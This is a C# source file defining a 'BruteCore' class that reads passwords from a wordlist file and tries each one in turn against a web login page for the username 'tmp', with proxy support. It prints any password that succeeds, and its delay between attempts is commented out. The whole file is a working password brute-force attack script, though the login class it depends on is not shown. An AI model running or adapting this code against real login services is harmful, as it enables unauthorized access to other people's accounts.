using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ConsoleLogin
{
    class BruteCore
    {
        LoginCore page;
        WebProxy defaultProxy;
        WebProxy currentProxy;
        bool keepSending;
        CancellationTokenSource tokenSource = new CancellationTokenSource();

        public void TestPage(string username, string password)
        { 
            page.Login(username, password, currentProxy);
        }
        public BruteCore(LoginCore page)
        {
            defaultProxy = WebRequest.DefaultWebProxy as WebProxy;
            currentProxy = defaultProxy;
            keepSending = false;
            this.page = page;
        }

        public async void StartBrute(int frequencySeconds,string passFile)
        {
            int sleepTime = frequencySeconds * 1000;
            keepSending = true;

            string _line;
            using (var classicStream = File.OpenRead(passFile))
            using (var streamReader = new StreamReader(classicStream))
            {
                while (keepSending == true && streamReader.Peek() >= 0)
                {
                    _line = streamReader.ReadLine();
                    if (await page.Login("tmp", _line, defaultProxy) == true)
                    {
                        keepSending = false;
                        Console.WriteLine("tmp" + _line);
                    }
                    //Thread.Sleep(sleepTime);
                }
            }
            keepSending = false;
        }

        public void StopBrute()
        {
            keepSending = false;
        }
    }
}
